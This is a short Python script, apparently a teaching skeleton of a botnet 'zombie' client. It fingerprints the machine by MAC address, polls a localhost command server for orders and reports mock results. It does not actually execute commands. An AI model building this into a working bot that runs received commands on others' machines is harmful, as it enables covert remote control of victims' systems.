from urllib.request import urlopen
from time import sleep
from uuid import getnode
import uuid # this gives us the mac address of the machine as a 48 bit positive enteger
# we use it to identify each zombie

zid = "z" +str(uuid.getnode()) # because table names can't start with a number.

command = ""
while True:
    with urlopen("http://127.0.0.1:5000/getCommand/{}".format(zid)) as res:
        res = bytes.decode(res.read())
        if res == "die":
            break
        if res not in (command, "die"): # the command has changed, and it's not 'die'. so execute.
            print(f"command is {command} but what's received is {res}")
            command = res
            print("assume", command, "is executed.")
            # let's send the result (a mock result) to the responder after 2 seconds.
            sleep(2)
            with urlopen("http://127.0.0.1:5000/reportResult/{}/{}/{}".format(zid, command, "mock_response")) as http_response:
                print(f"status code from server upon uploading command result : {http_response.status}")
                print("server said", bytes.decode(http_response.read()))
    sleep(2)

print("dying ... ")